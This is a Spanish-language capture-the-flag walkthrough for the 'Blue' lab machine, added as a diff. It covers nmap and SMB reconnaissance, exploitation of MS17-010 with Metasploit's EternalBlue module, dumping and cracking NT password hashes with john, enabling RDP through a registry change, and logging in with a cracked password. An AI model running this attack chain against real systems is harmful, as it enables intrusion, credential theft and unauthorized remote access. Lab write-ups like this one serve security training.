@@ -1,0 +1,96 @@
+# Blue
+
+## Reconocimiento
+
+```
+ping -c3 <ip>
+
+mkdir -p CTF/Blue
+
+cd CTF/Blue
+
+mkdir recon content exploit
+
+cd recon
+
+export IP=<ip-blue>
+
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $IP -oG puertos
+
+cat puertos | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',' | xclip
+
+sudo nmap -p135,139,445,3389,49152,49153,49154,49158,49160 -sV -sC -n -vvv $IP -oN blue.nmap
+
+```
+
+### Recon windows
+
+```
+crackmapexec smb 10.10.40.49
+smbmap -H 10.10.40.49
+smbmap -H 10.10.40.49 -u 'null'
+```
+
+## Búsqueda de vulnerabilidades
+
+```
+nmap -p445 -n -vvv --script vuln 10.10.40.49  -oN blue.vulns
+```
+
+## Explotación
+
+Buscar exploits con el comando:
+
+```
+searchsploit ms17-010
+```
+
+Encontramos el exploit Eternalblue, disponible para metasploit
+
+```
+sudo msfdb init
+msfconsole -q
+```
+search enternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST <ip-blue>
+set LHOST <ip-kali>
+exploit
+```
+`sysinfo`
+`ps`
+migrate -N winlogon.exe
+search -f flag*
+shell
+wmic useraccount get name,sid
+run winenum
+
+## Crackeo de contraseñas
+
+```
+hashdumpd
+```
+
+### Opción 1
+
+```
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes
+```
+
+### Opción 2
+
+https://crackstation.net/
+
+
+Para permitir RDP:
+
+```
+shell
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
+
+
+```
+xfreerdp /v:$IP /u:jon /p:alqfna22 /size:840x600 /tls-seclevel:0 /timeout:80000
+```
